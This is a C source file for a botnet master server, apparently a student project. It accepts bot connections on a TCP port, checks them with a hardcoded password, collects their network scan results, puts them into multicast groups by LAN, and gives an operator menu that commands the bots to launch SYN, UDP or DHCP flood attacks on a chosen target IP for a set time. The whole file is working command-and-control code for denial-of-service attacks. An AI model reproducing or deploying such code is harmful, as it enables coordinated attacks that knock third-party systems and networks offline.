#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <time.h>
#include <sys/time.h>
#include <fcntl.h>

//to be DEFINE or not to be
#define PORT_NUM 4200
#define Buffer_size 512
#define MaxBot 10

//struct for message type our protocol
struct MessageHello{
    short type; //0
    char hello[6];
};
struct MessageKeepAlive{
    short type;  //1
    short id;
};
struct MessageAck{
    short type;  //2
    short option;   //0-just ack, 1-IP, 2-ID
    char payload[16];  //ip or ID
};
struct MessageRequest{
    short type;  //3
    short option;   //0-NMAP,1-attack,2-exit
    char target[16];  //ip
    short attackType; //1 SYN,2 UDP, 3 DHCP
    int time;
};
struct MessageReport{
    short type;   //4
    short option;   //0-finish attack, 1-keepAlive error, 2-Unread message error, 3-NMAP
    short id;
    char* data;
};

//prototype
void* welcomeThread(void* arg);
void* newTCP(void* arg);
void* newMULTI(void* arg);
int createWelcomeSocket(int port, int maxClient);
int ReadHello(char* buffer);
int FindNewLan(int index);
char** ReadReport(char * buffer);
void WriteKeepAlive(char* buffer);
void HandleUserInput(char* buffer);
void SetAttackTime(char address[16], int time);
void WriteRequest(char* buffer,short option);
void WriteAck(char* buffer, short option, char* data);
void CheckUnderZero(int resulte, char const* message);
void CheckNoZero(int resulte, char const* message);
void CheckNull(char* resulte, char const* message);
//char* ReadMessage(char* buffer);
//void WriteMessage(char* buffer,int state,char* payload);

//global
char hello[6]="Hel1O";   //password for authentication
int portNum=PORT_NUM;
int MainFlag=1;
int fullFlag=0;
int numOfconnect=0;
int welcomeSocket=0;
int pip[2];
int MCpip[MaxBot][2]={0};
int TCPpip[MaxBot][2]={0};
int MCflag[MaxBot]={0}; //to close multicast group
char** botDATA[MaxBot]={NULL};   //for each bot the first cell is the number of the cell he got, and then each cell has HOST_IP and PORT from the nmap
char* networkDATA[MaxBot][3]={NULL};  //for each multicast network, [0] is the LAN, [1] is the multicast IP , [2] is number of BOT in the lan
int clientSocket[MaxBot]={0};
struct sockaddr_in clientAddr[MaxBot];
pthread_t BotTCPconnection[MaxBot]={0};
pthread_t BotMULTICASTconnection[MaxBot]={0};
pthread_t WelcomeSocketThread=0;


//------------------MASTER SERVER CODE------------------
//1. main() -> init communication thread (AKA welcomeThread) and enter into
//              infinity loop with "menu" for MASTER command (using function HandleUserInput)
//2. welcomeThread()-> init TCP welcomeSocket and listen for new connection (using function createWelcomeSocket),
//                      for each new connection he create new thread to handle the connection (AKA newTCP)
//3. newTCP()-> after accept the connection, start the OPEN STAGE (including HELLO authentication and NMAP , create DATABASE for the bot,
//             inside NMAP he check if new multicast need to be open using function FindNewLan()),
//             after OPEN STAGE start the ESTABLISH STAGE, do infinity loop to listen for TCP message or to send when needed.
//4. newMULTI()-> if this is the first BOT from new LAN , a new thread created by newTCP() to create the multicast group that going
//                 to used for sending KEEPALIVE/COMMAND for the bots.
//5. HandleUserInput() -> like she sound, handle all options (DATABASE, ATTACK, EXIT), if attack she get help from SetAttackTime
//5.special struct -> for each message type, describe above the PROTOTYPE, for each message type there is a match READ\WRITE function
//              like ReadHello()\WriteAck and etc.
//6. CheckUnderZero/NoZero/Null() function-> to check return value below zero/not zero/ Null...

void* newMULTI(void* arg){
    int multiSocket=0,errnum=0;
    char ip[15],MCbuffer[Buffer_size];
    struct sockaddr_in multiAddr;
    strcpy(ip,arg);
    struct timeval timeout;
    socklen_t multi_size;
    multi_size=sizeof(multiAddr);
    fd_set current_socket_multi, ready_socket_multi;
    timeout.tv_sec = 30;
    timeout.tv_usec = 0;
    unsigned char ttl=32;
    int id;
    //---INIT MULTICAST SOCKET-------
    sscanf(ip,"%*[^.]%*c%3d",&id);
    memset(multiAddr.sin_zero, 0, sizeof multiAddr.sin_zero);
    multiSocket=socket(AF_INET,SOCK_DGRAM,0);
    CheckUnderZero(multiSocket, "error in multisocket open\n");
    errnum=setsockopt(multiSocket,IPPROTO_IP,IP_MULTICAST_TTL,(void*)&ttl,sizeof(ttl));
    CheckUnderZero(errnum, "error in TTL option\n");

    multiAddr.sin_family = AF_INET;
    multiAddr.sin_port = htons(portNum+1);
    multiAddr.sin_addr.s_addr = inet_addr(ip);

    printf("finish make multicast group %s\n",ip);
    MCflag[id-1]=1;  //mark active multicast
    sleep(5);
    WriteKeepAlive(MCbuffer);
    errnum=sendto(multiSocket,MCbuffer,20,0,(struct sockaddr *)&multiAddr,multi_size);
    CheckUnderZero(errnum, "error in send multicast\n");
    printf("send KEEP ALIVE in multi\n");

    FD_ZERO(&current_socket_multi);
    FD_SET(MCpip[id-1][0],&current_socket_multi);   //for data from MASTER
    FD_SET(pip[0],&current_socket_multi);   //for exit command
    //-----------KEEPALIVE IN MULTICAST EVERY 30 SEC ----------
    while (MainFlag&&MCflag[id-1]){
        timeout.tv_sec = 20;
        ready_socket_multi=current_socket_multi;
        errnum=select(FD_SETSIZE, &ready_socket_multi, NULL, NULL, &timeout);
        CheckUnderZero(errnum, "error in select\n");
        if (errnum==0){   //timeout
            WriteKeepAlive(MCbuffer);
            errnum=sendto(multiSocket,MCbuffer,sizeof(Buffer_size),0,(struct sockaddr *)&multiAddr,multi_size);
            CheckUnderZero(errnum, "error in send multicast\n");
            printf("send KEEP ALIVE in multi\n");
        }  else if (FD_ISSET(MCpip[id-1][0],&ready_socket_multi)&&MainFlag){  //master COMMAND
            memset(MCbuffer,0,Buffer_size);
            errnum=read(MCpip[id-1][0],MCbuffer,Buffer_size);  //return number of byes
            CheckUnderZero(errnum,"error in read from pipe\n");
            if (errnum>0){
                MCbuffer[errnum]='\0';
                errnum=sendto(multiSocket,MCbuffer,Buffer_size,0,(struct sockaddr *)&multiAddr,multi_size);
                CheckUnderZero(errnum, "error in send multicast\n");
                printf("send COMMAND in MC group %s\n",ip);
            }  else {   //master close server
                memset(MCbuffer,0,Buffer_size);
                WriteRequest(MCbuffer,2);
                sendto(multiSocket,MCbuffer,Buffer_size,0,(struct sockaddr *)&multiAddr,multi_size);
            }
        } else if (FD_ISSET(pip[0],&ready_socket_multi)) {   //master close server
            memset(MCbuffer, 0, Buffer_size);
            WriteRequest(MCbuffer, 2);
            sendto(multiSocket, MCbuffer, Buffer_size, 0, (struct sockaddr *) &multiAddr, multi_size);
        }
    }
    id--;   
    free(networkDATA[id][0]);
    free(networkDATA[id][1]);
    free(networkDATA[id][2]);
    networkDATA[id][0]=NULL;
    networkDATA[id][1]=NULL;
    networkDATA[id][2]=NULL;
    printf("closing multicast group %s\n",ip);
    pthread_exit(NULL);
}

void* newTCP(void* arg) {
    int index=*((int*)arg);
    int numOfByte=0;
    char TCPbuffer[Buffer_size]={0};
    char** report;
    int runFlag=1,i=0,freeFlag=1;
    int test,len,network;   //'test' is int for error check
    char* data;
    struct timeval timeout;
    fd_set current_socket_tcp, ready_socket_tcp;

    timeout.tv_sec = 30;
    timeout.tv_usec = 0;
    printf("new TCP connection!\n");
    //----------------------------------OPEN STAGE --------------------------------------------
    //-------first stage of auth- HELLO------
    FD_ZERO(&current_socket_tcp);
    FD_SET((clientSocket[index]),&current_socket_tcp);
    FD_SET(pip[0],&current_socket_tcp);
    test=select(FD_SETSIZE, &current_socket_tcp, NULL, NULL, &timeout);
    CheckUnderZero(test, "error in select\n");
    if (FD_ISSET(clientSocket[index],&current_socket_tcp)){
        memset(TCPbuffer,0,Buffer_size);
        numOfByte= recv(clientSocket[index],TCPbuffer,Buffer_size,0);
        CheckUnderZero(numOfByte, "error in reading\n");
        if (!ReadHello(TCPbuffer)){  //HELLO not match
            printf("HELLO not MATCh\n");
            runFlag=0;
            freeFlag=0;
        } else {
            printf("HELLO OK\n");
            sleep(1);
            index++;   // save th 0 index for the server
            len=snprintf(NULL,0,"%d",index);
            data=malloc(sizeof(char)*(len+1));
            CheckNull(data,"error in malloc\n");
            snprintf(data,len+1,"%d",index);
            index--;
            WriteAck(TCPbuffer,2,data);
            free(data);
            test=send(clientSocket[index],TCPbuffer,Buffer_size,0);
            CheckUnderZero(test,"error in send\n");
            sleep(2);
        }
    }else if (FD_ISSET(pip[0],&current_socket_tcp)) {  //master close server
        runFlag=0;
        freeFlag=0;
        WriteRequest(TCPbuffer,2);
        test=send(clientSocket[index],TCPbuffer,Buffer_size,0);
        CheckUnderZero(test,"error in send\n");
    } else {   //timeout
        printf("HELLO timeout\n");
        runFlag=0;
        freeFlag=0;
    }
    //-------second stage of auth- NMAP------
    if(runFlag){
        FD_ZERO(&current_socket_tcp);
        FD_SET((clientSocket[index]),&current_socket_tcp);
        FD_SET(pip[0],&current_socket_tcp);
        timeout.tv_sec = 59;   //timeout for NMAP is 1 min
        test=select(FD_SETSIZE, &current_socket_tcp, NULL, NULL, &timeout);
        CheckUnderZero(test, "error in select\n");
        if (test==0){
            printf("NMAP timeout\n");
            runFlag=0;
            freeFlag=0;
        } else if (FD_ISSET(clientSocket[index],&current_socket_tcp)){
            memset(TCPbuffer,0,Buffer_size);
            numOfByte= recv(clientSocket[index],TCPbuffer,Buffer_size,0);
            CheckUnderZero(numOfByte,"error in recv\n");
            if (numOfByte==0){
                printf("BOT close connection\n");
                runFlag=0;
                freeFlag=0;
            } else {
                botDATA[index] = ReadReport(TCPbuffer);  //return NULL if nmap no good and then close connection
                if (botDATA[index]!=NULL){
                    printf("got NMAP\n");   //check for new LAN
                    network = FindNewLan(index);
                    if (network==-2){  //this is first lan we need new thread to the multicast
                        network=index;  //-2 only to tell us it's totaly new, and then it's like the index
                        printf("going to make multi ip:%s lan:%s\n",networkDATA[network][1],networkDATA[network][0]);
                        pthread_join(BotMULTICASTconnection[index],NULL);
                        test = pthread_create(&BotMULTICASTconnection[index], NULL, newMULTI, networkDATA[network][1]);
                        CheckNoZero(test, "error create multicast thread\n");
                    }
                    WriteAck(TCPbuffer, 1, networkDATA[network][1]);
                    sleep(1);
                    test=send(clientSocket[index], TCPbuffer, Buffer_size, 0);
                    CheckUnderZero(test, "error in send\n");
                } else {
                    runFlag=0;
                    freeFlag=0;
                    printf("error in nmap go to close the connection\n");
                }
            }
        } else if (FD_ISSET(pip[0],&current_socket_tcp)) {  //master close server
            runFlag=0;
            freeFlag=0;
            WriteRequest(TCPbuffer,2);
            test=send(clientSocket[index],TCPbuffer,Buffer_size,0);
            CheckUnderZero(test,"error in send\n");
        }
    }
    //------------------------------finish OPEN---------------------------------
    FD_ZERO(&current_socket_tcp);
    FD_SET((clientSocket[index]),&current_socket_tcp);
    FD_SET(pip[0],&current_socket_tcp); //if master close command
    FD_SET(TCPpip[index][0],&current_socket_tcp);  //if bot is part of attack so we need to wait for him
    sleep(2);
    //-------------------------------------ESTABLISH STAGE--------------------------------------------
    while(MainFlag&&runFlag) {
        timeout.tv_sec = 30;
        ready_socket_tcp = current_socket_tcp;
        test = select(FD_SETSIZE, &ready_socket_tcp, NULL, NULL, &timeout);
        CheckUnderZero(test, "error in select\n");
        if (test == 0) { //timeout
            printf("KEEPALIVE TIMEOUT\n");
            runFlag = 0;
        } else {
            if (FD_ISSET(TCPpip[index][0],&current_socket_tcp)) {  //bot go to attack so we need to wait for X sec to his report
                memset(TCPbuffer, 0, Buffer_size);
                test = read(TCPpip[index][0], TCPbuffer, Buffer_size);  //return number of byes
                if ((test > 0)&&(MainFlag)) {  //goind to ATTACK MODE
                    CheckUnderZero(test, "error in read from pipe\n");
                    test = 0;
                    memcpy(&test, TCPbuffer, sizeof(int));
                    /////-----------------------ATTACK MODE--------------------------
                    timeout.tv_sec = (test+5);
                    ready_socket_tcp = current_socket_tcp;
                    test = select(FD_SETSIZE, &ready_socket_tcp, NULL, NULL, &timeout);
                    CheckUnderZero(test, "error in select\n");
                    if (test == 0) {
                        printf("attack timeout\n");
                        runFlag = 0;
                    } else if (FD_ISSET(clientSocket[index], &ready_socket_tcp)) {
                        memset(TCPbuffer, 0, Buffer_size);
                        numOfByte = recv(clientSocket[index], TCPbuffer, Buffer_size, 0);
                        CheckUnderZero(numOfByte, "error in read\n");
                        if (numOfByte == 0) { //bot exit
                            printf("bot exit\n");
                            runFlag = 0;
                        } else {
                            report = ReadReport(TCPbuffer);  //return NULL if message unreadable
                            if (report == NULL) {
                                printf("corrupt message, kill this BOT...\n");
                                runFlag = 0;
                            } else {
                                printf("message is %s\n", report[0]);
                                free(report[0]);
                                free(report);
                            }
                        }
                    } else if (FD_ISSET(pip[0], &current_socket_tcp)) {  //master close server
                        runFlag = 0;
                        WriteRequest(TCPbuffer, 2);
                        test = send(clientSocket[index], TCPbuffer, Buffer_size, 0);
                        CheckUnderZero(test, "error in send\n");
                    }
                    /////---------------------FINISH ATTACK MODE-----------------------------
                } else if (FD_ISSET(clientSocket[index], &ready_socket_tcp)) {
                    memset(TCPbuffer, 0, Buffer_size);
                    numOfByte = recv(clientSocket[index], TCPbuffer, Buffer_size, 0);
                    CheckUnderZero(numOfByte, "error in read\n");
                    if (numOfByte == 0) { //bot exit
                        printf("bot exit\n");
                        runFlag = 0;
                    } else {
                        if (TCPbuffer[0] == 1) {
                            printf("got KEEPALIVE\n");
                        } else {
                            report = ReadReport(TCPbuffer);  //return NULL if message unreadable
                            if (report == NULL) {
                                printf("corrupt message, kill this BOT...\n");
                                runFlag = 0;
                            } else {
                                printf("message is %s\n", report[0]);
                                free(report[0]);
                                free(report);
                            }
                        }
                    }
                } else if (FD_ISSET(pip[0], &current_socket_tcp)) {  //master close server
                    runFlag = 0;
                    WriteRequest(TCPbuffer, 2);
                    test = send(clientSocket[index], TCPbuffer, Buffer_size, 0);
                    CheckUnderZero(test, "error in send\n");
                }
            }
        }
    }
    //----FREE AND EXIT----
    close(clientSocket[index]);
    clientSocket[index]=0;
    //check if he last of his LAN to close the multicast:
    //IMPORTANT- the FindNewLan() return the index where the LAN is in networkDATA, but ALSO increase the number of bot by 1
    if(MainFlag&&freeFlag){ //if the close not because MASTER abort, we need to update things, else, just close
        network=FindNewLan(index);
        i=0;
        memcpy(&i,networkDATA[network][2],sizeof(int));
        i=i-2;  //update the number of bot in  LAN (the check make +1, so when i leave it -2 )
        if (i==0){ //last one, need to close theMC group
            MCflag[network]=0;
        }
        memset(networkDATA[network][2],0,sizeof(int));  //DO NOT MOVE THIS
        memcpy(networkDATA[network][2],&i,sizeof(int));
    }

    if (botDATA[index]!=NULL){
        ///free char** table
        test=0;
        memcpy(&test,botDATA[index][0],sizeof(int));
        for(i=0;i<=test;i++){
            free(botDATA[index][i]);
        }
        free(botDATA[index]);
        botDATA[index]=NULL;
    }
    numOfconnect--;
    if (numOfconnect==(MaxBot-1)){  //if we had all connection taken and now someone get out we can open again
        fullFlag=0;
    }
    printf("close TCP number %d\n",index);
    pthread_exit(NULL);
}

void* welcomeThread(void* arg){
    int errnom=0 ,i=0,index=0;
    fd_set current_socket, ready_socket;
    socklen_t client_size;

    welcomeSocket= createWelcomeSocket(portNum, MaxBot);

    FD_ZERO(&current_socket);
    FD_SET(welcomeSocket,&current_socket);
    FD_SET(pip[0],&current_socket);

    while (MainFlag){
        ready_socket= current_socket;
        errnom=select(FD_SETSIZE, &ready_socket,NULL,NULL,NULL);
        CheckUnderZero(errnom, "select error\n");
        if(FD_ISSET(welcomeSocket,&ready_socket)){
            if((numOfconnect==MaxBot)&&!fullFlag){  //if we have maxConneted, we close the welcome socket
                //close(welcomeSocket);
                //FD_CLR(welcomeSocket,&current_socket);
                fullFlag=1;     //to use later when we want to re-open the socket
            }
            if(!fullFlag){   //if we have free connection, we accept the new one
                index=numOfconnect;
                while(clientSocket[index%MaxBot]!=0){ ++index;} //find place for the new one
                index=index%MaxBot;
                pthread_join(BotTCPconnection[index],NULL);  //clean resources
                //---------accept new connection------
                client_size= sizeof(clientAddr[index]);
                memset(&clientAddr[index],0,client_size);
                clientSocket[index]= accept(welcomeSocket,(struct sockaddr*)&clientAddr[index],&client_size);
                CheckUnderZero(clientSocket[index], "accept error");
                errnom=pthread_create(&BotTCPconnection[index],NULL,newTCP,(void*)&index);
                CheckNoZero(errnom, "error TCP pthread_create\n");
                numOfconnect++;
            }
        } else if (FD_ISSET(pip[0],&ready_socket)){  //if MASTER close server
            MainFlag=0; //close socket
        }
    }

    for(i=0;i<MaxBot;i++){
        pthread_join(BotTCPconnection[i], NULL);
        pthread_join(BotMULTICASTconnection[i], NULL);
    }

    close(welcomeSocket);
    printf("WelcomeSocket close\n");
    pthread_exit(NULL);
}

int main()  {
    int i=0,err=0;
    char buffer[Buffer_size]={0};
    fd_set current_socket, ready_socket;
    CheckUnderZero(pipe(pip), "error in pipe\n");
    CheckUnderZero(fcntl(pip[0],F_SETFL,O_NONBLOCK),"error in flag pipe\n");
    for (i = 0; i < MaxBot;i ++) {
        CheckUnderZero(pipe(MCpip[i]), "error in MCpipe\n");
        CheckUnderZero(pipe(TCPpip[i]), "error in TCPpipe\n");
        CheckUnderZero(fcntl(TCPpip[i][0],F_SETFL,O_NONBLOCK),"error in flag TCPpipe\n");
        CheckUnderZero(fcntl(MCpip[i][0],F_SETFL,O_NONBLOCK),"error in flag TCPpipe\n");
    }
    err=pthread_create(&WelcomeSocketThread,NULL,welcomeThread,NULL);
    CheckNoZero(err,"error in Welcome pthread_create\n");

    sleep(1);
    FD_ZERO(&current_socket);
    FD_SET(fileno(stdin),&current_socket);
    //endless loop for MASTER INTERFACE CONTROL
    while(MainFlag) {
        printf("\n\n*-*-*-*-*-HI MASTER I'M LISTEN FOR YOUR COMMNAD-*-*-*-*-*\n\n");
        printf("1.DATABASE\n");
        printf("2.ATTACK\n");
        printf("3.EXIT\n\n");
        ready_socket= current_socket;
        err=select(FD_SETSIZE, &ready_socket,NULL,NULL,NULL);
        CheckUnderZero(err,"error in select\n");
        if(FD_ISSET(fileno(stdin),&ready_socket)){
            fgets(buffer,Buffer_size,stdin);
            i=(strlen(buffer)+1);
            buffer[i]='\0';
            printf("got MASTER input!\n");
            HandleUserInput(buffer);
        }
    }
    //------EXIT-----
    pthread_join(WelcomeSocketThread, NULL);
    printf("main exit\n");
    return 0;
}

void HandleUserInput(char* buffer){
    int j=0,i=0,row=0,k=0;
    int state=(int)atoi(&buffer[0]);
    switch (state) {
        case 1:
            printf("*-*-*-*-*-DATA BASE-*-*-*-*-*\n");
            printf("-------BOT DATA--------\n");
            for(i=0;i<MaxBot;i++){
                if (botDATA[i]!=NULL){
                    j=i+1;
                    printf("*BOT_ID#%d:\n",j);
                    memcpy(&row,botDATA[i][0],sizeof(row));
                    for ( k = 1; k <=row ; ++k) {
                        printf("\t\t%s\n",botDATA[i][k]);
                    }
                }
            }
            printf("-------NETWORK DATA--------\n");
            for(i=0;i<MaxBot;i++){
                if (networkDATA[i][0]!=NULL){
                    k=0;
                    j=i+1;
                    memcpy(&k,networkDATA[i][2],sizeof(k));
                    printf("*NETWORK#%d: LAN->%s MULTICAST IP->%s  NUMBER OF BOT->%d\n",j,networkDATA[i][0],networkDATA[i][1],k);
                }
            }
            break;
        case 2:
           WriteRequest(buffer,1);
            break;
        case 3:
            printf("EXIT ALL...\n");
            MainFlag=0;
            write(pip[1],&buffer[0],1);  //sign 0 for exit
            for (j = 0; j <MaxBot ;j ++) {
                write(MCpip[j][1],&buffer[0],1);  //sign 0 for exit
                write(TCPpip[j][1],&buffer[0],1);  //sign 0 for exit
            }
            break;
        default:
            printf("UNKNOWN INPUT, please try again...\n");
    }
}

int createWelcomeSocket(int port, int maxClient){
    int serverSocket, opt=1;
    struct sockaddr_in serverAddr;
    socklen_t server_size;
    memset(serverAddr.sin_zero, 0, sizeof serverAddr.sin_zero);

    serverSocket= socket(PF_INET,SOCK_STREAM,0);
    if(serverSocket<0){
        perror("socket failed");
        exit(-1);
    }
    if (setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,&opt, sizeof(opt))){
        perror("socket option failed");
        close(serverSocket);
        exit(-1);
    }
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    server_size= sizeof(serverAddr);

    if((bind(serverSocket,(struct sockaddr *)&serverAddr,server_size))<0) {
        perror("binding failed");
        close(serverSocket);
        exit(-1);
    }

    printf("Server is listen to port %hd and wait for new client...\n", port);

    if((listen(serverSocket,maxClient))<0){
        perror("listen failed");
        close(serverSocket);
        exit(-1);
    }
    return serverSocket;
}

int FindNewLan(int index){
    char findNetwork[12]={'\0'};
    sscanf(botDATA[index][1],"%*[^:]%*c%s",findNetwork);
    int i,k=1;
    //search if the lan is already in database
    //networkDATA[i][0] is lan and [i][1] is multicast 224.(i+1).0.40
    for (i = 0; i <MaxBot ; ++i) {
        if (networkDATA[i][0]!=NULL){
            if(!strcmp(networkDATA[i][0],findNetwork)){
                MCflag[i]=1; //DO NOT MOVE THIS
                memcpy(&k,networkDATA[i][2],sizeof(int));
                k++;  //update the number of bot in the new LAN
                memset(networkDATA[i][2],0,sizeof(int));
                memcpy(networkDATA[i][2],&k,sizeof(int));
                return i;
            }
        }
    }
    //if we got here we need to make new address
    i=0;
    while (networkDATA[i][0]!=NULL){i++;}
    networkDATA[i][0]=strdup(findNetwork);
    snprintf(findNetwork, 12, "224.%d.0.40", (i+1));
    networkDATA[i][1]=strdup(findNetwork);
    networkDATA[i][2]=(char *)malloc(sizeof(int));  //to hold int-> number of the BOT in the LAN
    CheckNull(networkDATA[i][0],"error in malloc\n");
    CheckNull(networkDATA[i][1],"error in malloc\n");
    CheckNull(networkDATA[i][2],"error in malloc\n");
    memset(networkDATA[i][2],0,sizeof(int));
    memcpy(networkDATA[i][2],&k,sizeof(int));     //k=1 start value
    return -2;   //return to indicate it's new network according to the index

}

int ReadHello(char* buffer){
    struct MessageHello HELLO;
    int offset;
    if (buffer[0]!=0){
        return 0;
    } else {
        memset(&HELLO,0,sizeof(HELLO));
        offset=sizeof(HELLO.type);
        memcpy(&HELLO.hello,buffer+offset,sizeof(HELLO.hello));
        return (!strcmp(hello,HELLO.hello));
    }
}

char** ReadReport(char * buffer){
    struct MessageReport REPORT;
    int offset=0,len=0,row=0,i=0;
    int port;
    char network[15]={'\0'},host[4]={'\0'};
    char A[4]={'\0'}, B[4]={'\0'},C[4]={'\0'};
    char myBuffer[Buffer_size];
    char** shit;
    memset(&REPORT,0,sizeof(REPORT));
    memcpy(&REPORT.type,buffer,sizeof(REPORT.type));
    if (REPORT.type!=4){  //message not good
        return NULL;
    }
    offset=sizeof(REPORT.type);
    memcpy(&REPORT.option,buffer+offset,sizeof(REPORT.option));
    offset+=sizeof(REPORT.option);
    memcpy(&REPORT.id,buffer+offset,sizeof(REPORT.id));
    offset+=sizeof(REPORT.id);
    memset(myBuffer,0,Buffer_size);
    if(REPORT.option==0){
        sprintf(myBuffer,"BOT #%hd report FINISH ATTACK\n",REPORT.id);
    } else if (REPORT.option==1){
        sprintf(myBuffer,"BOT #%hd report ERROR KEEPALIVE\n",REPORT.id);
    } else if (REPORT.option==2){
        sprintf(myBuffer,"BOT #%hd report ERROR UNDEFINE MESSAGE\n",REPORT.id);
    } else if(REPORT.option==3){  //NMAP
        memcpy(&row,buffer+offset,sizeof(row));
        offset+=sizeof(row);
        shit=(char**)malloc(sizeof(char*)*(row+1));
        CheckNull((char*)shit,"error in malloc\n");
        shit[0]=(char*)malloc(sizeof(char)*4);
        CheckNull(shit[0],"error in malloc\n");
        memset(shit[0],0,4);
        memcpy(shit[0],&row,sizeof(row));
        for(i=0;i<row;i++){
            memset(myBuffer,0,Buffer_size);
            sscanf(buffer+offset,"%[^.]%*c%[^.]%*c%[^.]%*c%[^:]%*c%d",A,B,C,host,&port);
            sprintf(network,"%s.%s.%s",A,B,C);
            len=snprintf(NULL,0,"%d#IP:%s .%s PORT:%d\n",(i+1),network,host,port);  //to update offset2 for inside buffer copy
            sprintf(myBuffer,"%d#IP:%s .%s PORT:%d\n",(i+1),network,host,port);
            shit[i+1]=(char*)malloc(sizeof(char)*(len+3));
            CheckNull(shit[i+1],"error in malloc\n");
            memset(shit[i+1],0,len+3);
            memcpy(shit[i+1],myBuffer,len);
            shit[i+1][len+1]='\0';
            len=snprintf(NULL,0,"%s.%s.%s.%s:%d\n",A,B,C,host,port);   //to update offset for reading buffer
            offset+=len;
            offset++;
            port=0;
            memset(network,'\0',15);
            memset(host,'\0',4);
            memset(A,'\0',4);
            memset(B,'\0',4);
            memset(C,'\0',4);
        }
        return shit;
    } else{  //undefine
        return NULL;
    }
    shit=(char**)malloc(sizeof(char*));
    CheckNull((char*)shit,"error in malloc\n");
    shit[0]=strdup(myBuffer);
    CheckNull(shit[0],"error in malloc\n");
    return shit;
}

void WriteAck(char* buffer, short option, char* data){
    struct MessageAck ACK;
    int offset=0;
    memset(buffer,0,Buffer_size);
    memset(&ACK,0,sizeof(ACK));
    ACK.type=2;
    ACK.option=option;
    strcpy(ACK.payload,data);
    memcpy(buffer,&ACK.type,sizeof(ACK.type));
    offset=sizeof(ACK.type);
    memcpy(buffer+offset,(&ACK.option),sizeof(ACK.option));
    offset+=sizeof(ACK.option);
    memcpy(buffer+offset,(&ACK.payload),sizeof(ACK.payload));
}

void WriteKeepAlive(char* buffer){
    struct MessageKeepAlive KEEPALIVE;
    int offset=0;
    memset(buffer,0,Buffer_size);
    memset(&KEEPALIVE,0,sizeof(KEEPALIVE));
    KEEPALIVE.type=1;
    KEEPALIVE.id=0;
    memcpy(buffer,&KEEPALIVE.type,sizeof(KEEPALIVE.type));
    offset=sizeof(KEEPALIVE.type);
    memcpy(buffer+offset,(&KEEPALIVE.id),sizeof(KEEPALIVE.id));
}

void WriteRequest(char* buffer, short option){
    struct MessageRequest REQUEST;
    char ip[15]={'\0'};
    int offset;
    int rrr=0;
    memset(buffer,0,sizeof(&buffer));
    memset(&REQUEST,0,sizeof(REQUEST));
    REQUEST.type=3;
    memcpy(buffer,&REQUEST.type,sizeof(REQUEST.type));
    offset=sizeof(REQUEST.type);
    REQUEST.option=option;
    memcpy(buffer+offset,&REQUEST.option,sizeof(REQUEST.option));
    offset+=sizeof(REQUEST.option);
    if (option==2){      //exit
        return;
    } else if (option==1) {  //ATTACK!
        while (rrr!=4){
            printf("plz enter data like this: MC_IP TRAGET_IP ATTACK_TYPE(1-SYN 2-UDP 3-DHCP) ATTACK_TIME\n");
            rrr=scanf("%s %s %hd %d",ip, REQUEST.target,&REQUEST.attackType,&REQUEST.time);
        }
        memcpy(buffer+offset,&REQUEST.target,sizeof(REQUEST.target));
        offset+=sizeof(REQUEST.target);
        memcpy(buffer+offset,&REQUEST.attackType,sizeof(REQUEST.attackType));
        offset+=sizeof(REQUEST.attackType);
        memcpy(buffer+offset,&REQUEST.time,sizeof(REQUEST.time));
        offset=0;
        sscanf(ip,"%*[^.]%*c%3d",&offset);  //to get the ID of the network
        offset--;
        offset=write(MCpip[offset][1],buffer,Buffer_size);
        CheckUnderZero(offset,"error in write to pipe\n");
        SetAttackTime(REQUEST.target,REQUEST.time);
    }
}

void SetAttackTime(char address[16], int time){
    //This function do -> search for bots that part off the attack and alert
    // there TCP_thread to wait "time" until they finish
    int localtime=time;
    int i,k;
    char localBuffer[10]={'\0'};
    char findNetwork[15]={'\0'};
    char cmpNetwork[15]={'\0'};
    char A[4]={'\0'}, B[4]={'\0'},C[4]={'\0'};
    memcpy(localBuffer,&localtime,sizeof(int ));
    sscanf(address,"%[^.]%*c%[^.]%*c%[^.]",A,B,C);
    sprintf(findNetwork,"%s.%s.%s",A,B,C);
    for (i = 0; i <MaxBot ; ++i) {
        if (botDATA[i]!=NULL){
            memset(cmpNetwork,0,12);
            sscanf(botDATA[i][1],"%*[^:]%*c%s",cmpNetwork);
            if(!strcmp(cmpNetwork,findNetwork)){
                k=write(TCPpip[i][1],localBuffer,sizeof(int ));
                CheckUnderZero(k,"error int write to TCP pipe\n");
            }
        }
    }
}

void CheckUnderZero(int resulte, char const* message){
    if(resulte<0){
        perror(message);
        exit(-1);
    }
}

void CheckNoZero(int resulte, char const* message){
    if(resulte!=0){
        perror(message);
        exit(-1);
    }
}

void CheckNull(char* resulte, char const* message){
    if(resulte==NULL){
        perror(message);
        exit(-1);
    }
}
